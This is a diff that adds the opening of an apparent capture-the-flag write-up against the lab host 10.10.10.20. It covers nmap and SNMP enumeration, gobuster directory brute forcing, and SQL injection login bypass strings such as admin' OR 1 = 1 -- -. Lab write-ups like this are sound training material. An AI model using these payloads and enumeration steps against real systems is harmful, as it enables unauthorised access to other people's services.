@@ -1,0 +1,21 @@
+I start off with an nmap scan, only one port open:
+└─# nmap -sC -sV -A 10.10.10.20
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Under Development!
+
+Directory bruteforcing :
+└─# gobuster dir -u http://10.10.10.20 -w /usr/share/wordlists/directory-list-2.3-medium.txt 
+===============================================================
+/dev
+
+Visiting http://10.10.10.20/dev/; we find a login page. We try several combinations and admin' OR 1 = 1 -- - : password gets us in.
+At some bruteforce doing admin ' OR 1 = 1 OR ''=' shows another username : thrasivoulos
+
+└─# nmap -sU -p 161 10.10.10.20
+
+PORT    STATE         SERVICE
+161/udp open|filtered snmp
+
+└─# snmpwalk -c public -v2c 10.10.10.20
